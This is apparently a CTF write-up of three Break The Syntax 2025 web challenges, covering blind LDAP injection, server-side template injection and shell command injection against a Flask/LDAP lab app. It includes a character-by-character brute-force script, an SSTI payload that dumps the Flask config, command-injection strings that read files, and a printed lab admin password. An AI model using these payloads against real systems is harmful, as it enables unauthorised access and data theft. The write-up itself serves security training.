+++
title = "Break The Syntax 2025"
date = "2025-05-09"
weight = 0

[taxonomies]
tags=["ldap-injection", "ldap", "ctf"]
ctf=["BTS"]
+++

These challenges are part of series. They are based on the same architecture, but with some differences.

As will become apparent they are the trifecta of injection

# Lightweight 1 - LDAP Injection

The first challenge is exploiting LDAP Injection in a LDAP app.

## Code review

From the handout we were given some files, important of them we have:

- `entrypoint.sh`
- `base.ldif`
- `app.y`

Starting off with the `entrypoint.sh`:

This is the starting point of the app, from here we can trace what is going to happen.

```bash
#!/bin/bash

# append description with flag
echo "description: BtSCTF{fake_flag}" >> /base.ldif && cat /base.ldif

# start
echo Starting
service slapd start

sleep 1
ldapadd -D cn=admin,dc=bts,dc=ctf -f /base.ldif -x -w STYE0P8dg55WGLAkFobiwMSJKix1QqpH

cd /app && python3 -m gunicorn -b 0.0.0.0:80 app:app

```

We can see that the flag is appended to the `base.ldif` file, which is a file that contains entries that are loaded into the directory.

See [LDIF examples](https://www.ibm.com/docs/en/sdse/6.4.0?topic=ldif-examples) for more.

This means that the flag will be appended into this file:

```ldif
dn: ou=people,dc=bts,dc=ctf
objectClass: organizationalUnit
ou: people

dn: uid=testuser,ou=people,dc=bts,dc=ctf
objectClass: inetOrgPerson
cn: Test User
sn: User
uid: testuser
userPassword: REDACTED
employeeType: active
# description: BtSCTF{fake_flag} <--- HERE
```

And then `app.py` will be run


Below is the `app.py`:

```python
from flask import Flask, render_template, request
from ldap3 import Server, Connection, ALL

app = Flask(__name__)

ADMIN_PASSWORD = "STYE0P8dg55WGLAkFobiwMSJKix1QqpH"


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        server = Server('localhost', port=389, get_info=ALL)

        conn = Connection(server, 
                          user=f'cn=admin,dc=bts,dc=ctf',
                          password=ADMIN_PASSWORD,
                          auto_bind=True)
        
        if not conn.bind():
            return 'Failed to connect to LDAP server', 500

        conn.search('ou=people,dc=bts,dc=ctf', f'(&(employeeType=active)(uid={username})(userPassword={password}))', attributes=['uid'])

        if not conn.entries:
            return 'Invalid credentials', 401

        return render_template('index.html', username=username)
    
    return render_template('login.html')
```

The keys parts i want to highlight are: 

- `from ldap3 import Server, Connection, ALL`
- `conn.search('ou=people,dc=bts,dc=ctf', f'(&(employeeType=active)(uid={username})(userPassword={password}))', attributes=['uid'])` 

We can do LDAP injection, and we have to focus on:

```ldap
(&(employeeType=active)(uid=INPUT)(userPassword=INPUT))
```

A common way of exploit LDAP Injections are using wildcards: `*`

So POSTing
```json
{
    "username":"*",
    "password":"*"
}
```

Gives the query:

```
(&(employeeType=active)(uid=*)(userPassword=*))
```

And that actually logs us in. But we know that the flag was in the `description:` entry and that is our goal.

If we do:
```json
{
    "username":"*)(|(description=BtSCTF{*",
    "password":"*"
}
```
```
(&(employeeType=active)(uid=*)(|(description=BtSCTF{*))(userPassword=*))
```

I wrote a script to append to the prefix if we stumble upon the next correct character in the flag.

```python
import requests
import sys
import time

# Configuration
# BASE_URL   = 'https://lightweight-2.chal.bts.wh.edu.pl'  # Adjust if needed
BASE_URL   = 'http://localhost:5000'  # Adjust if needed
CHARS      = '}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?$@#'


def get_flag():
    session = requests.Session()
    flag = 'BtSCTF{'
    #flag = 'BtSCTF{_bl1nd_ld4p_1nj3ct10n_y1pp333333'
    
    while not flag.endswith('}'):
        found_char = False
        
        for c in CHARS:
            prefix = flag + c

            print(flag)

            time.sleep(0.001)

            payload_username = f"*)(|(description={prefix}" + "*)"
            payload_password = f"*"
            data = {
                'username': payload_username,
                'password': payload_password
            }

            # Send 
            resp = session.post(BASE_URL, data=data)

            # append if found
            if resp.status_code == 200:
                flag += c
                print(f"[+] Found character: {c} → {flag}")
                found_char = True
                break

        if not found_char:
            print(f"[-] No matching character found for prefix {flag!r}")
            sys.exit(1)

    return flag

if __name__ == '__main__':
    result = get_flag()
    print(f"\nFlag: {result}")
```

After the fact I optimized the script, where I first prune the character set, reducing the amount of requests sent.

```py
def prune_charset(prefix,charset):
    session = requests.Session()
    pruned = ""
    it = 0

    for c in charset:

        payload_username = f"*)(|(description={prefix}*" + c + "*)"
        payload_password = f"*"

        data = {
            'username': payload_username,
            'password': payload_password
        }

        resp = session.post(BASE_URL, data=data)
        it += 1


        if resp.status_code == 200:
            pruned += c
            # print(f"did not prune: {c}")

    print(f"Iterations : {it}")
    print(f"Pruned charset : {pruned}")
    return pruned
```


```text
[spagok@gok]$ python exp.py
Iterations : 69
Pruned charset : _bcdjlnptyBCDJLNPTY0134}

Trying: } (attempt 403)
Current Flag: BtSCTF{_bl1nd_ld4p_1nj3ct10n_y1pp333333

Trying: } (attempt 1001)
Current Flag: BtSCTF{_bl1nd_ld4p_1nj3ct10n_y1pp333333

Flag: BtSCTF{_bl1nd_ld4p_1nj3ct10n_y1pp333333}
```


# Lightweight 2

The second type of injection is SSTI.

We observe that if we login, our name is reflected (or the query).

e.g: 
`username=testuser&password=*`


![login](/imgs/ctf/bts2025/ssti1.png)

So if we POST:
```
username=testuser)(|(cn={{config }}&password=*)
```

Then we get:

![login](/imgs/ctf/bts2025/ssti2.png)
```py
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'BtSCTF{_ld4p_1nj3ction_plus_sst1_3quals_fl4g}', 'SECRET_KEY_FALLBACKS': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'TRUSTED_HOSTS': None, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PARTITIONED': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'MAX_FORM_MEMORY_SIZE': 500000, 'MAX_FORM_PARTS': 1000, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'PROVIDE_AUTOMATIC_OPTIONS': True}>
```


# Lightweight 3

The third is command injection.

We start by logging in with `testuser:*`(LDAPi is still possible)

This one allows us to search for a *prism*, which is an `objectClass`

The gist is that disrupt the execution and injection our own commands, i.e. `/search?prism='`

There are characters that are not allowed, such as `;`.

We eventually found that we could gain command execution with:

```
/search?prism=b*'&id #'
```
```bash
uid=1001(prism) gid=1001(prism) groups=1001(prism)
```

The ` #` is key, since we can we can block out the rest of the line, gaining more control over whether the command injection fails.

(Actually we could just `/search?prism='&id #'`, but it is easier to ensure that the query is happy when trying to find the right payload!)


We can begin to find the flag!


```bash
b*'&cat app.py #'
```
Gives the the source code, but no flag there.

```py
import re
from flask import Flask, render_template, render_template_string, request
....
....
    return render_template('login.html')
```

Lets find the flag:

```bash
b*'&ls #'
```

```
__pycache__
add-prism-schema.ldif
app.py
base.ldif
entrypoint.sh
hint
requirements.txt
static
templates
```

Then we just 

```bash
b*'&cat entrypoint.sh #'
```

Gives:

```bash
#!/bin/bash

echo "BtSCTF{${FLAG_PREFIX}_gl4d_t0_s33_y0u_g0t_output_out_of_th3_comm4nd_1nj3ction}" > /root/flag.txt

cd /app/
echo Starting
/usr/sbin/service slapd start

sleep 1

ldapadd -Q -Y EXTERNAL -H ldapi:/// -f add-prism-schema.ldif
ldapadd -D cn=admin,dc=bts,dc=ctf -f base.ldif -x -w STYE0P8dg55WGLAkFobiwMSJKix1QqpH

sudo -u prism python3 -m gunicorn -b 0.0.0.0:8080 app:app
```

And it turns out that the flag is just: `BtSCTF{_gl4d_t0_s33_y0u_g0t_output_out_of_th3_comm4nd_1nj3ction}`

I wonder if it was unintended as if you `b*'&cat hint #` you get: `{"data":"Flag is in /root/flag.txt :)\n","image":null}` :trollface:

If they did not set the `${FLAG_PREFIX}` variable, then it would be empty and the flag correct, but if you `b*'|echo ${FLAG_PREFIX} #'` you get `{"data":"#)) -w STYE0P8dg55WGLAkFobiwMSJKix1QqpH\n","image":null}` (However I could not reproduce that value after the fact, it just gave "\\n")


## After the fact

While writing this, I see that we did not follow the inteded path. As outlined in the [Author Write-up](https://github.com/PWrWhiteHats/BtS-2025-Writeups/tree/master/web/lightweight-3/writeup) we apparently had to escalate to root in order to read the `/root/flag.txt` (as mentioned in the `hint.txt`). I guess the did not think about the `entrypoint.sh` file or forgot to implement the `$FLAG_PREFIX` thing.



# Source
You can find the source, which they posted after the ctf. There was only source for the first (I think). [BTS2025 Source - Github](https://github.com/PWrWhiteHats/BtS-2025-Writeups) 

